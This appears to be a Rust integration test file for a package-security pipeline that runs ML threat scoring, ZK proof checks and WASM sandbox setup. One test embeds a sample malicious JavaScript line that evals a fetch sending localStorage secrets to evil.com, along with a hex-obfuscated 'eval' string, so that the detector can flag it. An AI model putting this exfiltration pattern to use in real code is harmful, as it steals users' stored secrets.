//! End-to-end integration tests for advanced validation pipeline
//!
//! Tests the full pipeline: ML detection -> WASM validation -> ZK proof generation

const TEST_PACKAGE_CODE: &str = r#"
/**
 * A safe test package
 */
function add(a, b) {
    return a + b;
}

function multiply(a, b) {
    return a * b;
}

module.exports = { add, multiply };
"#;

#[test]
fn test_full_validation_pipeline() {
    // Step 1: ML-based threat detection
    println!("[1/3] Running ML detection...");
    let features = ml_validator::FeatureExtractor::extract("npm", TEST_PACKAGE_CODE)
        .expect("Failed to extract features");
    
    let ml_validator = ml_validator::MlValidator::new();
    let ml_result = ml_validator.predict(&features);
    
    println!("  ML Score: {}/100 ({:?})", ml_result.threat_score, ml_result.threat_level);
    assert!(ml_result.threat_score < 50, "Test package should be safe");
    
    // Step 2: ZK Proof generation (simulated with test data)
    println!("[2/3] Generating ZK proof...");
    let content_hash = common::sha256(TEST_PACKAGE_CODE.as_bytes());
    let manifest_hash = common::sha256(b"test-manifest");
    
    let zk_inputs = zk_validator::PackageInputs::new(
        content_hash,
        manifest_hash,
        95, // High static analysis score
        true, // Sandbox passed
    );
    
    let zk_validator = zk_validator::ZkValidator::new()
        .expect("Failed to create ZK validator");
    
    let zk_proof = zk_validator.generate_proof(&zk_inputs)
        .expect("Failed to generate ZK proof");
    
    // Verify the proof
    let is_valid = zk_validator.verify_proof(&zk_proof, &zk_inputs.public_inputs())
        .expect("Failed to verify ZK proof");
    
    assert!(is_valid, "ZK proof should be valid");
    println!("  ZK Proof: Valid ✓");
    
    // Step 3: WASM sandbox (configuration test)
    println!("[3/3] WASM sandbox configuration...");
    let wasm_config = wasm_sandbox::SandboxConfig::default()
        .with_memory_limit(256 * 1024 * 1024)
        .with_timeout_secs(30);
    
    let _wasm_sandbox = wasm_sandbox::WasmSandbox::new(wasm_config)
        .expect("Failed to create WASM sandbox");
    
    println!("  WASM Sandbox: Ready ✓");
    
    println!("\n✓ Full validation pipeline completed successfully!");
}

#[test]
fn test_malicious_package_detection() {
    const MALICIOUS_CODE: &str = r#"
        eval("fetch('http://evil.com?data=' + localStorage.getItem('secret'))");
        const obfuscated = "\x65\x76\x61\x6c";
    "#;
    
    // ML should detect this as suspicious
    let features = ml_validator::FeatureExtractor::extract("npm", MALICIOUS_CODE)
        .expect("Failed to extract features");
    
    let ml_validator = ml_validator::MlValidator::new();
    let ml_result = ml_validator.predict(&features);
    
    // Should have higher threat score due to eval and network calls
    assert!(ml_result.threat_score > 30, 
        "Malicious code should have higher threat score, got {}", 
        ml_result.threat_score);
    
    println!("Malicious package detected: Score={}/100", ml_result.threat_score);
}

#[tokio::test]
async fn test_cli_advanced_commands() {
    // Test that CLI advanced module functions exist and can be called
    
    // This is a smoke test to ensure the module is properly integrated
    use chain_registry_cli::advanced;
    
    // We can't fully test without actual files, but we can verify the module loads
    println!("CLI advanced module loaded successfully");
}
